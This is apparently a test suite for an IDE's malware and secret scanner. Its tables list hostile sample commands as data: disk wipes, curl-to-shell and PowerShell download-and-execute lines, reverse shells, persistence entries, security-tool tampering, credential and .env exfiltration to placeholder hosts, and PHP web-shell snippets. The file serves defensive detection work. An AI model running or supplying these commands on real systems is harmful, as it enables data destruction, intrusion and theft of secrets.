/*
 * Copyright (C) 2026 ezTxmMC
 * SPDX-License-Identifier: AGPL-3.0-or-later
 *
 * This file is part of Lumen IDE. It is free software: you can redistribute it
 * and/or modify it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the License,
 * or (at your option) any later version. See the LICENSE file for details.
 */

/**
 * The scanner's tests.
 *
 * Every rule has a table entry with texts it must report and texts it must
 * leave alone — the second half matters as much as the first, a scanner that
 * cries wolf gets switched off. `run.js` calls `scannerChecks` and
 * `scannerServerChecks`; the file can also be run on its own:
 *
 *   node test/scanner.js
 */

import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import {
  PROJECT_SCAN, RULES, SCANNER_VERSION, isProjectFile, scanCommand, scanManifest, scanProjectFiles, scanText, summarize, toRule, verdictOf,
} from '../src/scanner/index.js';
import { bytesToUtf8, decodeBase64, decodeBase64Text } from '../src/scanner/base64.js';
import { lexJs, parseJsonc } from '../src/scanner/strings.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const DIST = path.resolve(here, '../../addons/dist');

/* ---------------------------------------------------------------------- *
 * Helpers
 * ---------------------------------------------------------------------- */

const idsOf = (report) => report.findings.map((finding) => finding.id);
const raw = String.raw;

/** The test strings are built from pieces: the test file itself must not look like malware or leak a "secret". */
const EICAR = ['X5O!P%@AP[4\\PZX54(P^)7CC)7}$', 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!', '$H+H*'].join('');
const fake = (prefix, length, alphabet = 'a') => prefix + alphabet.repeat(length);

/** Runners: how a sample reaches the scanner. */
const via = {
  command: (sample) => scanCommand(sample),
  shell: (sample) => scanText(sample, { kind: 'shell', file: 'run.sh' }),
  any: (sample) => scanText(sample, { kind: 'any', file: 'notes.txt' }),
  powershell: (sample) => scanText(sample, { kind: 'powershell', file: 'run.ps1' }),
  python: (sample) => scanText(sample, { kind: 'python', file: 'run.py', target: 'project' }),
  jsProject: (sample) => scanText(sample, { kind: 'js', file: 'app.js', target: 'project' }),
  code: (sample) => scanManifest({ code: { main: sample } }),
  page: (sample) => scanManifest({ pages: [{ id: 'p', title: 'P', format: 'html', content: sample }] }),
  file: (file) => (sample) => scanProjectFiles([{ path: file, text: sample }]),
};

/** The table: rule id → how to feed it, what it must find, what it must not. */
const CASES = new Map();
function expect(id, runner, yes, no) {
  assert.ok(!CASES.has(id), `duplicate test table entry for ${id}`);
  CASES.set(id, { runner, yes, no });
}

/* ---- Commands: destructive ---- */
expect('SEC-CMD-001', via.command,
  ['rm -rf /', 'rm -rf /*', 'rm -rf ~', 'rm -rf $HOME', 'rm -fr --no-preserve-root /', 'rm -rf --no-preserve-root /', 'sudo rm -rf /', 'rm -r -f /', 'rm -rf "$HOME"'],
  ['rm -rf /tmp/x', 'rm -rf ./build', 'rm -rf "$DIR/"', 'rm -rf ~/projects/old', 'rm file.txt', 'rm -rf node_modules']);
expect('SEC-CMD-002', via.command,
  ['rm -rf /etc', 'rm -rf /usr/', 'rm -r -f /home'],
  ['rm -rf /var/cache/app', 'rm -rf /home/user/x', 'ls /etc']);
expect('SEC-CMD-003', via.command,
  ['find / -name "*.log" -delete', 'find ~ -type f -exec rm {} +'],
  ['find ./build -delete', 'find /tmp/x -delete', 'find . -name "*.js"']);
expect('SEC-CMD-004', via.command,
  ['dd if=/dev/zero of=/dev/sda bs=1M', 'dd if=x.iso of=/dev/nvme0n1'],
  ['dd if=/dev/zero of=./file.img bs=1M count=10', 'dd if=/dev/sda of=backup.img']);
expect('SEC-CMD-005', via.command,
  ['mkfs.ext4 /dev/sdb1', 'sudo mkfs -t ext4 /dev/nvme0n1p1'],
  ['mkfs.ext4 disk.img', 'echo mkfs']);
expect('SEC-CMD-006', via.command,
  ['cat x > /dev/sda', 'echo hi >/dev/nvme0n1'],
  ['echo x > /dev/null', 'ls 2>/dev/null']);
expect('SEC-CMD-007', via.command,
  ['shred -n 3 /dev/sda', 'wipefs -a /dev/sdb'],
  ['shred -u secret.txt', 'wipefs --help']);
expect('SEC-CMD-008', via.command,
  [':(){ :|:& };:', 'bomb(){ bomb|bomb& };bomb'],
  ['foo(){ echo hi; }', ':(){ :; }']);
expect('SEC-CMD-009', via.command,
  ['chmod -R 777 /', 'chmod 777 -R /', 'chmod -R 755 ~'],
  ['chmod -R 755 ./dist', 'chmod 777 /tmp/x', 'chmod +x script.sh']);
expect('SEC-CMD-010', via.command,
  ['chown -R root:root /', 'chown -R me ~'],
  ['chown -R me:me ./data', 'chown root file']);
expect('SEC-CMD-011', via.command,
  ['format C:', 'format d: /fs:ntfs'],
  ['git format-patch -1', 'clang-format -i a.c', 'format string']);
expect('SEC-CMD-012', via.command,
  [raw`del /s /q C:\ `.trim(), raw`del /f /s /q %USERPROFILE%\*.*`],
  [raw`del /s /q C:\Temp\old`, 'del file.txt']);
expect('SEC-CMD-013', via.command,
  [raw`rd /s /q C:\ `.trim(), raw`rmdir /s /q %SystemRoot%\ `.trim()],
  [raw`rd /s /q C:\build`, 'rmdir old']);
expect('SEC-CMD-014', via.command,
  [raw`Remove-Item -Recurse -Force C:\ `.trim(), 'Remove-Item -Path ~ -Recurse -Force', raw`Remove-Item -Recurse -Force $env:USERPROFILE\ `.trim()],
  [raw`Remove-Item -Recurse -Force .\build`, raw`Remove-Item C:\Temp\x -Recurse`]);
expect('SEC-CMD-015', via.command,
  ['diskpart /s wipe.txt', 'cipher /w:C:'],
  ['diskpart', 'cipher /e']);
expect('SEC-CMD-016', via.command,
  ['vssadmin delete shadows /all /quiet', 'wmic shadowcopy delete'],
  ['vssadmin list shadows']);
expect('SEC-CMD-017', via.command,
  ['wbadmin delete catalog -quiet'],
  ['wbadmin get versions']);
expect('SEC-CMD-018', via.command,
  ['bcdedit /set {default} recoveryenabled no'],
  ['bcdedit /enum']);

/* ---- Commands: download and execute, reverse shells ---- */
expect('SEC-CMD-019', via.command,
  ['curl -fsSL https://x.example/i.sh | sh', 'wget -qO- http://x.example | sudo bash', 'curl x.example | python3', 'curl x.example | node'],
  ['curl https://x.example | jq .', 'curl x.example | tee out.txt', 'curl -o out.sh https://x.example', 'npm install']);
expect('SEC-CMD-020', via.command,
  ['bash <(curl -s https://x.example)', 'sh <(wget -qO- http://x.example)'],
  ['diff <(ls a) <(ls b)']);
expect('SEC-CMD-021', via.command,
  ['sh -c "$(curl -fsSL https://x.example)"', 'eval "$(curl -s https://x.example)"'],
  ['eval "$(ssh-agent -s)"', 'sh -c "echo hi"']);
expect('SEC-CMD-022', via.command,
  ['iwr https://x.example/y.ps1 | iex', 'Invoke-WebRequest http://x.example | Invoke-Expression'],
  ['iwr https://x.example -OutFile y.zip']);
expect('SEC-CMD-023', via.command,
  ['iex (iwr https://x.example)', 'IEX (New-Object Net.WebClient).DownloadString("http://x.example")'],
  ['iex $cmd', 'Invoke-Expression $x']);
expect('SEC-CMD-024', via.command,
  ['(New-Object Net.WebClient).DownloadString("http://x.example") | iex'],
  ['(New-Object Net.WebClient).DownloadString("http://x.example")']);
expect('SEC-CMD-025', via.command,
  ["$w.DownloadFile('http://x.example/a.exe','a.exe'); Start-Process a.exe"],
  ["$w.DownloadFile('http://x.example/a.zip','a.zip')"]);
expect('SEC-CMD-026', via.command,
  ['powershell -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB4ACkA', 'powershell.exe -NoP -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA=='],
  ['powershell -ExecutionPolicy Unrestricted -File a.ps1', 'powershell -Command Get-Date']);
expect('SEC-CMD-027', via.command,
  ['certutil -urlcache -f http://x.example/a.exe a.exe'],
  ['certutil -hashfile a.exe SHA256']);
expect('SEC-CMD-028', via.command,
  [raw`bitsadmin /transfer j http://x.example/a.exe C:\a.exe`, 'Start-BitsTransfer -Source http://x.example/a -Destination b'],
  ['bitsadmin /list']);
expect('SEC-CMD-029', via.command,
  ['mshta http://x.example/a.hta', 'mshta javascript:a'],
  [raw`mshta C:\local.hta`]);
expect('SEC-CMD-030', via.command,
  ['regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll'],
  ['regsvr32 /s mylib.dll']);
expect('SEC-CMD-031', via.command,
  ['rundll32 javascript:"\\..\\mshtml,RunHTMLApplication"'],
  ['rundll32 user32.dll,LockWorkStation']);
expect('SEC-CMD-032', via.command,
  [`python3 -c "import urllib.request; exec(urllib.request.urlopen('http://x.example').read())"`],
  ['python3 -c "print(1)"', 'python -c "import urllib; print(urllib.__name__)"']);
expect('SEC-CMD-033', via.command,
  [`node -e "require('https').get('https://x.example', r => r.on('data', d => eval(d)))"`],
  ['node -e "console.log(1)"']);
expect('SEC-CMD-034', via.command,
  ['curl -o x.sh https://x.example && sh x.sh', 'wget https://x.example -O a.sh; chmod +x a.sh; ./a.sh'],
  ['curl -o out.json https://x.example && jq . out.json', 'curl https://x.example']);
expect('SEC-CMD-035', via.command,
  ['bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'exec 5<>/dev/tcp/1.2.3.4/80 0<&5 1>&5'],
  ['bash -i', 'echo > /dev/tcp/localhost/80']);
expect('SEC-CMD-036', via.command,
  ['echo hi > /dev/tcp/evil.example.com/80'],
  ['echo > /dev/tcp/localhost/5432', 'exec 3<>/dev/tcp/$HOST/$PORT']);
expect('SEC-CMD-037', via.command,
  ['nc -e /bin/sh 10.0.0.1 4444', 'ncat 10.0.0.1 4444 -e /bin/bash', 'nc -c sh 1.2.3.4 80'],
  ['nc -zv host 22', 'nc -l 8080']);
expect('SEC-CMD-038', via.command,
  ['rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f'],
  ['mkfifo /tmp/pipe']);
expect('SEC-CMD-039', via.command,
  ['socat TCP:10.0.0.1:4444 EXEC:/bin/sh', 'socat exec:"bash -li",pty tcp:1.2.3.4:80'],
  ['socat TCP-LISTEN:8080,fork TCP:localhost:80']);
expect('SEC-CMD-040', via.command,
  [`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])'`,
    `php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3");'`,
    `perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);connect(S,$a);exec("/bin/sh -i");'`],
  [`python3 -c "print('hello')"`, `python -c "import socket; print(socket.gethostname())"`]);
expect('SEC-CMD-041', via.command,
  ["$c=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream()"],
  ["$c=New-Object System.Net.Sockets.TCPClient('h',1)"]);

/* ---- Commands: persistence ---- */
expect('SEC-CMD-042', via.command,
  ['echo "curl http://x.example | sh" >> ~/.bashrc', 'echo eval "$(base64 -d x)" >> ~/.zshrc'],
  ['echo "export PATH=$PATH:~/bin" >> ~/.bashrc', 'echo alias ll=ls >> ~/.zshrc']);
expect('SEC-CMD-043', via.command,
  ['(crontab -l; echo "* * * * * curl http://x.example | sh") | crontab -'],
  ['crontab -l', 'echo "0 * * * * /usr/bin/backup" | crontab -']);
expect('SEC-CMD-044', via.command,
  ['echo "* * * * * root curl http://x.example|sh" > /etc/cron.d/x'],
  ['echo "0 3 * * * root /usr/bin/backup" > /etc/cron.d/backup']);
expect('SEC-CMD-045', via.command,
  ['echo "[Service]" > /etc/systemd/system/x.service && systemctl enable x'],
  ['systemctl enable nginx', 'echo hi > /etc/systemd/system/x.service']);
expect('SEC-CMD-046', via.command,
  ['launchctl load ~/Library/LaunchAgents/x.plist', 'echo x > ~/Library/LaunchAgents/a.plist'],
  ['launchctl list']);
expect('SEC-CMD-047', via.command,
  ['schtasks /create /tn x /tr "powershell -w hidden iwr http://x.example" /sc minute', 'schtasks /create /tn a /tr "cmd /c calc.exe" /sc daily'],
  ['schtasks /query', raw`schtasks /create /tn backup /tr C:\backup.exe /sc daily`]);
expect('SEC-CMD-048', via.command,
  [raw`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\a.exe`, raw`New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name x`],
  [raw`reg add HKCU\Software\MyApp /v x /d 1`, raw`reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`]);
expect('SEC-CMD-049', via.command,
  ['echo ssh-rsa AAAA >> ~/.ssh/authorized_keys', 'cat key.pub | tee -a ~/.ssh/authorized_keys'],
  ['cat ~/.ssh/authorized_keys', 'ssh-copy-id host']);
expect('SEC-CMD-050', via.command,
  ['echo "alice ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers', 'echo "x ALL=(ALL) NOPASSWD:ALL" | tee /etc/sudoers.d/x'],
  ['sudo -l', 'visudo -c']);
expect('SEC-CMD-051', via.command,
  ['useradd -m backdoor', 'adduser evil'],
  ['useradd --help', 'userdel x']);
expect('SEC-CMD-052', via.command,
  ['net user hacker P@ss /add', 'net localgroup administrators hacker /add'],
  ['net user', raw`net use Z: \\srv\share`]);

/* ---- Commands: tampering ---- */
expect('SEC-CMD-053', via.command,
  ['iptables -F', 'ufw disable', 'iptables -P INPUT ACCEPT', 'systemctl stop firewalld'],
  ['iptables -L', 'ufw enable', 'ufw status']);
expect('SEC-CMD-054', via.command,
  ['setenforce 0', 'sed -i s/SELINUX=enforcing/SELINUX=disabled/ /etc/selinux/config', 'systemctl stop apparmor'],
  ['setenforce 1', 'getenforce']);
expect('SEC-CMD-055', via.command,
  ['Set-MpPreference -DisableRealtimeMonitoring $true', 'sc stop WinDefend'],
  ['Get-MpPreference', 'Set-MpPreference -DisableRealtimeMonitoring $false']);
expect('SEC-CMD-056', via.command,
  [raw`Add-MpPreference -ExclusionPath C:\temp`],
  ['Get-MpPreference']);
expect('SEC-CMD-057', via.command,
  ['netsh advfirewall set allprofiles state off', 'Set-NetFirewallProfile -Profile Domain -Enabled False'],
  ['netsh advfirewall show allprofiles', 'netsh advfirewall set allprofiles state on']);
expect('SEC-CMD-058', via.command,
  ['spctl --master-disable', 'csrutil disable'],
  ['spctl --status']);
expect('SEC-CMD-059', via.command,
  ['curl -O https://x.example/a.zip && xattr -d com.apple.quarantine a.app'],
  ['xattr -cr /Applications/MyApp.app', 'xattr -d com.apple.quarantine ~/Downloads/a.app']);
expect('SEC-CMD-060', via.command,
  ['history -c', 'unset HISTFILE', 'export HISTSIZE=0', 'rm ~/.bash_history', 'Clear-History'],
  ['history | grep ssh', 'history 10']);
expect('SEC-CMD-061', via.command,
  ['chattr +i /etc/passwd'],
  ['chattr -i /etc/passwd', 'chattr +a log']);
expect('SEC-CMD-062', via.command,
  ['kill -9 -1', 'killall5'],
  ['kill -9 1234', 'kill -1 123']);
expect('SEC-CMD-063', via.command,
  [': > /var/log/auth.log', 'rm -rf /var/log/*', 'wevtutil cl Security', 'Clear-EventLog -LogName Application'],
  ['tail -f /var/log/syslog', 'echo x >> /var/log/app.log', 'rm /var/log/myapp/old.log']);

/* ---- Commands: privilege ---- */
expect('SEC-CMD-064', via.command,
  ['sudo curl -fsSL https://x.example | sh', 'curl https://x.example | sudo bash'],
  ['sudo apt update', 'curl https://x.example | jq']);
expect('SEC-CMD-065', via.command,
  ['chmod u+s /bin/bash', 'chmod +s ./a', 'chmod 4755 /tmp/x', 'chmod 2755 d'],
  ['chmod 755 x', 'chmod +x x', 'chmod 644 x', 'chmod 0755 x']);
expect('SEC-CMD-066', via.command,
  ['setcap cap_setuid+ep /usr/bin/python3'],
  ['setcap cap_net_bind_service=+ep /usr/bin/node']);
expect('SEC-CMD-067', via.command,
  ['pkexec bash', 'usermod -aG sudo bob'],
  ['usermod -aG docker bob', 'sudo -u x ls']);
expect('SEC-CMD-068', via.command,
  ['docker run --privileged -v /:/host alpine chroot /host', 'docker run --privileged --pid=host alpine'],
  ['docker run --privileged alpine', 'docker run -v /:/host alpine']);
expect('SEC-CMD-069', via.command,
  ['docker run -v /var/run/docker.sock:/var/run/docker.sock alpine'],
  ['docker run alpine', 'docker run -v ./data:/data alpine']);

/* ---- Commands: exfiltration ---- */
expect('SEC-CMD-070', via.command,
  ['cat ~/.ssh/id_rsa | curl -d @- http://x.example', 'curl -F f=@~/.ssh/id_ed25519 http://x.example'],
  ['ssh -i ~/.ssh/id_rsa host', 'cat ~/.ssh/id_rsa.pub | curl http://x.example', 'chmod 600 ~/.ssh/id_rsa']);
expect('SEC-CMD-071', via.command,
  ['cat ~/.aws/credentials | nc 1.2.3.4 80', 'curl -d @.npmrc http://x.example', 'tar c ~/.kube/config | curl -T - http://x.example'],
  ['aws s3 ls', 'cat .npmrc', 'npm config get registry']);
expect('SEC-CMD-072', via.command,
  ['cat .env | curl -d @- http://x.example', 'curl -F f=@.env http://x.example', 'nc 1.2.3.4 80 < .env', 'printenv | curl -d @- http://x.example', 'env | base64 | curl -d @- http://x.example', 'curl -d "$(env)" http://x.example'],
  ['source .env && npm start', 'dotenv -e .env -- node a.js', 'env FOO=1 node a.js', 'printenv PATH']);
expect('SEC-CMD-073', via.command,
  ['curl -d @data.json https://api.x.example', 'curl -F file=@a.txt https://x.example', 'curl -T a.zip https://x.example', 'curl --data-binary @a https://x.example'],
  ['curl -d "a=1" https://x.example', 'curl https://x.example', 'curl -H "Content-Type: a" https://x.example']);
expect('SEC-CMD-074', via.command,
  ['wget --post-file=secret.txt http://x.example'],
  ['wget http://x.example']);
expect('SEC-CMD-075', via.command,
  ['cp ~/.config/google-chrome/Default/"Login Data" /tmp', 'sqlite3 cookies.sqlite .dump', 'cat "$HOME/Library/Application Support/Google/Chrome/Default/Cookies"'],
  ['google-chrome --headless', 'chrome-launcher']);
expect('SEC-CMD-076', via.command,
  ['cp ~/.bitcoin/wallet.dat /tmp', 'cat ~/.config/solana/id.json'],
  ['bitcoin-cli getinfo', 'ls ~/documents']);
expect('SEC-CMD-077', via.command,
  ['cat ~/.bash_history | curl -d @- http://x.example'],
  ['cat ~/.bash_history', 'history | tail']);
expect('SEC-CMD-078', via.command,
  ['security dump-keychain -d login.keychain', 'security find-generic-password -ga chrome'],
  ['security list-keychains', 'security -h']);

/* ---- Commands: miners and supply chain ---- */
expect('SEC-CMD-079', via.command,
  ['./xmrig -o pool:3333', 'minerd -a cryptonight', 'cpuminer-multi'],
  ['npm install minimist', 'ls miners', 'echo minerals']);
expect('SEC-CMD-080', via.command,
  ['xmrig -o stratum+tcp://pool.example.com:3333', 'stratum+ssl://x.example:443'],
  ['echo stratum db', 'curl http://stratum.example.com']);
expect('SEC-CMD-081', via.command,
  ['./miner --donate-level 1', 'xmrig --donate-level=0'],
  ['foo --donate', 'echo donate-level']);
expect('SEC-CMD-082', via.command,
  ['curl pool.supportxmr.com', 'xmr.nanopool.org:14444'],
  ['curl example.com', 'echo nanopool']);
expect('SEC-CMD-083', via.command,
  ['npm install https://evil.example/pkg.tgz', 'yarn add git+https://github.com/x/y.git'],
  ['npm install', 'npm install left-pad', 'npm i --save-dev typescript', 'npm install github:user/repo']);
expect('SEC-CMD-084', via.command,
  ['npm install http://evil.example/p.tgz'],
  ['npm install https://x.example/p.tgz', 'npm i http://localhost:4873/p.tgz']);
expect('SEC-CMD-085', via.command,
  ['npm install --registry https://evil.example/ left-pad', 'npm i --registry=http://1.2.3.4/'],
  ['npm install --registry https://registry.npmjs.org/', 'npm install --registry http://localhost:4873']);
expect('SEC-CMD-086', via.command,
  ['pip install foo --index-url http://x.example/simple', 'pip3 install -i http://x.example/simple foo', 'pip install --trusted-host x.example foo'],
  ['pip install foo', 'pip install foo --index-url https://pypi.org/simple']);
expect('SEC-CMD-087', via.command,
  ['pip install git+https://github.com/x/y.git', 'pip install https://x.example/y.whl'],
  ['pip install requests', 'pip install -r requirements.txt']);
expect('SEC-CMD-088', via.command,
  ['pip install git+https://x.example/y.git && curl http://x.example/z'],
  ['pip install git+https://x.example/y.git', 'curl http://x.example && pip install requests']);
expect('SEC-CMD-089', via.command,
  ['npm config set registry https://evil.example/', 'pip config set global.index-url http://x.example/simple'],
  ['npm config set registry https://registry.npmjs.org/', 'npm config get registry', 'pip config list']);

/* ---- Commands decoded by the scanner (raised by the pipeline) ---- */
expect('SEC-CMD-OBF-001', via.command,
  ['echo cm0gLXJmIC8= | base64 -d | sh', `powershell -enc ${Buffer.from('iex (iwr http://x.example/z)', 'utf16le').toString('base64')}`],
  ['echo aGVsbG8gd29ybGQ= | base64 -d', 'echo aGVsbG8gd29ybGQ= | base64 -d | sh']);
expect('SEC-CMD-OBF-002', via.command,
  ['echo aGVsbG8gd29ybGQ= | base64 -d | sh', 'base64 -d <<< aGVsbG8gd29ybGQ= | bash'],
  ['echo aGVsbG8gd29ybGQ= | base64 -d', 'echo cm0gLXJmIC8= | base64 -d']);
expect('SEC-CMD-OBF-003', via.command,
  ['r""m -rf /', "r'm' -rf /", 'rm${IFS}-rf${IFS}/', "$'\\x72\\x6d' -rf /", '{rm,-rf,/}'],
  ['rm -rf /', 'rm -rf "$HOME"', 'echo "it\'s fine"', 'ls']);

/* ---- Files and projects ---- */
const PKG = (scripts) => JSON.stringify({ name: 'x', version: '1.0.0', scripts }, null, 2);
expect('SEC-PKG-001', via.file('package.json'),
  [PKG({ postinstall: 'curl https://x.example/i.sh | sh' }), PKG({ preinstall: `node -e "require('child_process').exec('id')"` }), PKG({ install: 'wget https://x.example/a -O a && ./a' }), PKG({ prepare: 'powershell -c "iwr http://x.example"' })],
  [PKG({ postinstall: 'node scripts/setup.js' }), PKG({ prepare: 'husky install' }), PKG({ install: 'node-gyp rebuild' }), PKG({ build: 'curl https://x.example/health' }),
    JSON.stringify({ name: 'x', description: 'uses curl to download things' })]);
expect('SEC-PRJ-001', via.file('.vscode/tasks.json'),
  [JSON.stringify({ tasks: [{ label: 'a', command: 'echo hi', runOptions: { runOn: 'folderOpen' } }] }),
    '{ // comment\n "tasks": [ { "label": "x", "command": "curl http://x.example | sh", "runOptions": { "runOn": "folderOpen" }, }, ] }'],
  [JSON.stringify({ tasks: [{ label: 'a', command: 'echo hi' }] }), JSON.stringify({ tasks: [{ label: 'a', command: 'echo', runOptions: { runOn: 'default' } }] })]);
expect('SEC-PRJ-002', via.file('.devcontainer/devcontainer.json'),
  [JSON.stringify({ postCreateCommand: 'curl https://x.example/i.sh -o i.sh' }), JSON.stringify({ initializeCommand: ['wget', 'http://x.example/a'] }), JSON.stringify({ postStartCommand: { a: 'npm i', b: 'curl http://x.example' } })],
  [JSON.stringify({ postCreateCommand: 'npm install' }), JSON.stringify({ postCreateCommand: ['pip', 'install', '-r', 'requirements.txt'] })]);
expect('SEC-PRJ-003', via.file('.husky/pre-commit'),
  ['#!/bin/sh\ncurl https://x.example/h.sh -o /tmp/h.sh\nsh /tmp/h.sh'],
  ['#!/bin/sh\nnpx lint-staged']);
expect('SEC-PRJ-004', via.file('setup.py'),
  ["import urllib.request\nexec(urllib.request.urlopen('http://x.example').read())", "import os, requests\nos.system('id')\nrequests.get('http://x.example')"],
  ["from setuptools import setup\nsetup(name='x')", "import subprocess\nsubprocess.run(['git', 'rev-parse', 'HEAD'])"]);
expect('SEC-PRJ-005', via.file('.npmrc'),
  ['registry=https://evil.example/'],
  ['registry=https://registry.npmjs.org/', 'save-exact=true']);
expect('SEC-PRJ-006', via.file('.npmrc'),
  ['ignore-scripts=false\nregistry=https://evil.example/'],
  ['ignore-scripts=false', 'ignore-scripts=true\nregistry=https://evil.example/']);
expect('SEC-PRJ-007', via.file('.npmrc'),
  ['//registry.npmjs.org/:_authToken=npm_abcdefghijklmnop'],
  ['//registry.npmjs.org/:_authToken=${NPM_TOKEN}', 'save-exact=true']);
expect('SEC-PRJ-010', (sample) => scanProjectFiles([{ path: sample, text: '' }]),
  ['run.hta', 'x/readme.scr', 'docs/open.lnk', 'a.vbs'],
  ['a.txt', 'tool.exe', 'src/index.js']);
expect('SEC-PRJ-011', (sample) => scanProjectFiles([{ path: sample, text: '' }]),
  ['tool.exe', 'gradle/wrapper/gradle-wrapper.jar', 'build.bat', 'lib/a.dll'],
  ['a.js', 'readme.md', 'run.sh']);

/* ---- Secrets ---- */
const secret = (sample) => scanText(sample, { kind: 'json', file: 'config.json' });
expect('SEC-SCR-001', secret, [`key=${'AKIA'}${'IOSFODNN7ABCDEFG'}`], [`key=${'AKIA'}${'IOSFODNN7EXAMPLE'}`, 'AKIA']);
expect('SEC-SCR-002', secret, [fake('ghp_', 36)], ['ghp_short', 'github.com/ghp']);
expect('SEC-SCR-003', secret, [`${'xoxb'}-1234567890-abcdefghij`], ['xoxb-short']);
expect('SEC-SCR-004', secret, [`-----BEGIN ${'RSA '}PRIVATE KEY-----`, `-----BEGIN ${'OPENSSH '}PRIVATE KEY-----`], ['-----BEGIN PUBLIC KEY-----', '-----BEGIN CERTIFICATE-----']);
expect('SEC-SCR-005', secret, [fake('sk-ant-api03-', 30)], ['sk-ant-xyz']);
expect('SEC-SCR-006', secret, [fake('sk-proj-', 40)], ['sk-proj-short']);
expect('SEC-SCR-007', secret, [fake('AIza', 35)], ['AIza123']);
expect('SEC-SCR-008', secret, [fake('sk_live_', 30)], [fake('sk_test_', 30)]);
expect('SEC-SCR-009', secret, [`https://discord.com/api/webhooks/123456789012345678/${'a'.repeat(50)}`], ['https://discord.com/api/channels/1']);

/* ---- Obfuscation: extension ids go through the manifest, project ids through scanText ---- */
const blob = (length, letter = 'Q') => letter.repeat(length);
const project = (kind) => (sample) => scanText(sample, { kind, file: 'a', target: 'project' });
const codes = Array.from({ length: 30 }, (_, i) => 60 + i).join(',');
const hexRun = (count, start = 0x41) => Array.from({ length: count }, (_, i) => `\\x${(start + (i % 20)).toString(16)}`).join('');
const obfuscator = (count) => Array.from({ length: count }, (_, i) => `var _0x${(0x1a2b + i).toString(16)}=1;`).join('\n');

const pairs = [
  ['SEC-OBF-001', 'SEC-OBF-002', [`eval("${blob(500)}")`, `Function('${blob(450)}')`], [`eval("${blob(30)}")`, `eval("AGFzbQ${blob(500)}")`]],
  ['SEC-OBF-003', 'SEC-OBF-004', [`atob("${blob(500)}")`, `Buffer.from("${blob(500)}", "base64")`, `[Convert]::FromBase64String("${blob(500)}")`], ['atob("aGk=")', `atob("AGFzbQ${blob(500)}")`, `Buffer.from("H4sI${blob(500)}", "base64")`]],
  ['SEC-OBF-005', 'SEC-OBF-006', [`Buffer.from("${'ab'.repeat(250)}","hex")`], ['Buffer.from("abcd","hex")']],
  ['SEC-OBF-007', 'SEC-OBF-008', ['eval(atob("aGk="))', 'eval(unescape("%61"))'], ['eval("1+1")', 'atob("aGk=")']],
  ['SEC-OBF-009', 'SEC-OBF-010', ['new Function(atob("aGk="))'], ['new Function("a", "return a")']],
  ['SEC-OBF-011', 'SEC-OBF-012', [`String.fromCharCode(${codes})`], ['String.fromCharCode(65,66,67)']],
  ['SEC-OBF-013', 'SEC-OBF-014', [`"${hexRun(45)}"`], [`"${hexRun(5)}"`, `"${hexRun(60, 0xa0)}"`]],
  ['SEC-OBF-015', 'SEC-OBF-016', [obfuscator(25)], [obfuscator(3)]],
  ['SEC-OBF-017', 'SEC-OBF-018', ['eval(function(p,a,c,k,e,d){return p}("x",1,1,"".split("|"),0,{}))'], ['eval(function(x){return x})']],
];
for (const [extensionId, projectId, yes, no] of pairs) {
  expect(extensionId, via.code, yes, no);
  expect(projectId, project('js'), yes, no);
}
expect('SEC-OBF-019', project('powershell'),
  ['iex ([Convert]::FromBase64String("AAAA"))', '[Convert]::FromBase64String($s) | iex'],
  ['[Convert]::FromBase64String($s)']);
expect('SEC-OBF-020', project('python'),
  ['exec(base64.b64decode("cHJpbnQoMSk="))', "__import__('base64')"],
  ['print(base64.b64decode(x))']);

/* ---- Malware markers ---- */
expect('SEC-MAL-001', via.any, [EICAR, `{"a":"${EICAR.replace(/\\/g, '\\\\')}"}`], ['X5O!P%@AP is not it', 'EICAR']);
expect('SEC-MAL-002', via.any, ["<?php eval($_POST['x']); ?>", '<?php system($_GET["c"]); ?>'], ["<?php echo $_POST['name']; ?>"]);
expect('SEC-MAL-003', via.any, ['<?php eval(base64_decode("aGk=")); ?>', 'eval(gzinflate($x))'], ['$x = base64_decode($y);']);
expect('SEC-MAL-004', via.any, ['mimikatz.exe sekurlsa::logonpasswords', 'Invoke-Mimikatz'], ['mimic the user']);
expect('SEC-MAL-005', via.any, ['msfvenom -p windows/meterpreter/reverse_tcp', 'use meterpreter'], ['metastasis']);

/* ---- Extension code ---- */
expect('SEC-EXT-001', via.code,
  ['const cp = require("child_process");', 'import { exec } from "node:child_process";'],
  ['const x = "child_process is a module";']);
expect('SEC-EXT-002', via.code,
  ['execSync("ls")', 'cp.spawnSync("git")'],
  ['re.exec(str)', 'ctx.exec("git")']);
expect('SEC-EXT-003', via.code,
  ['eval(code)', 'const x = eval ("1")'],
  ['// eval(x)', '/* eval(x) */', 'model.eval(x)']);
expect('SEC-EXT-004', via.code,
  ['new Function("a", "return a")'],
  ['new Function("return this")', 'new Function("")']);
expect('SEC-EXT-005', via.code,
  ['vm.runInContext(code, ctx)', 'const s = new vm.Script(code)', 'runInNewContext(code)'],
  ['vm.isContext(x)']);
expect('SEC-EXT-006', via.code,
  ['process.binding("fs")'],
  ['process.binding("buffer")', 'process.bindings']);
expect('SEC-EXT-007', via.code,
  ['shell.openExternal(url)', 'shell.openPath(file)'],
  ['shell.openExternal("https://lumen.example")']);
expect('SEC-EXT-008', via.code,
  ['fs.writeFileSync(path.join(os.homedir(), ".ssh", "authorized_keys"), key)', 'fs.appendFile("/home/u/.bashrc", line, cb)'],
  ['fs.writeFileSync(path.join(storage, "cache.json"), "x")']);
expect('SEC-EXT-009', via.code,
